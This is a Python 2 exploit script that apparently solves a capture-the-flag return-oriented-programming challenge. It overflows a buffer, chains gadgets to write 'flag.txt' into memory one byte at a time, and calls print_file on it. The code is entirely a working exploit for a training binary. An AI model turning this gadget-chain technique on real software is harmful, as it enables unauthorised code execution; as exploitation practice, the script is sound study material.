import struct

def p32(addr):
    return struct.pack("<I", addr)

offset = 44

# popal ; cld ; ret
# pops EDI, ESI, EBP, ESP, EBX, EDX, ECX, EAX.
popal = 0x08048527

# xchg byte ptr [ecx], dl; ret;
xchg_to_ecx = 0x08048555

write_loc = 0x0804a000 + 0x50
print_file = 0x080483d0

payload = "\x90" * offset +\
    p32(popal) + "aaaa" + "bbbb" + "cccc" + "dddd" + "eeee" + p32(ord("f")) + p32(write_loc + 0x0) + "hhhh" + p32(xchg_to_ecx) +\
    p32(popal) + "aaaa" + "bbbb" + "cccc" + "dddd" + "eeee" + p32(ord("l")) + p32(write_loc + 0x1) + "hhhh" + p32(xchg_to_ecx) +\
    p32(popal) + "aaaa" + "bbbb" + "cccc" + "dddd" + "eeee" + p32(ord("a")) + p32(write_loc + 0x2) + "hhhh" + p32(xchg_to_ecx) +\
    p32(popal) + "aaaa" + "bbbb" + "cccc" + "dddd" + "eeee" + p32(ord("g")) + p32(write_loc + 0x3) + "hhhh" + p32(xchg_to_ecx) +\
    p32(popal) + "aaaa" + "bbbb" + "cccc" + "dddd" + "eeee" + p32(ord(".")) + p32(write_loc + 0x4) + "hhhh" + p32(xchg_to_ecx) +\
    p32(popal) + "aaaa" + "bbbb" + "cccc" + "dddd" + "eeee" + p32(ord("t")) + p32(write_loc + 0x5) + "hhhh" + p32(xchg_to_ecx) +\
    p32(popal) + "aaaa" + "bbbb" + "cccc" + "dddd" + "eeee" + p32(ord("x")) + p32(write_loc + 0x6) + "hhhh" + p32(xchg_to_ecx) +\
    p32(popal) + "aaaa" + "bbbb" + "cccc" + "dddd" + "eeee" + p32(ord("t")) + p32(write_loc + 0x7) + "hhhh" + p32(xchg_to_ecx) +\
    p32(print_file) + "quac" + p32(write_loc)

print payload
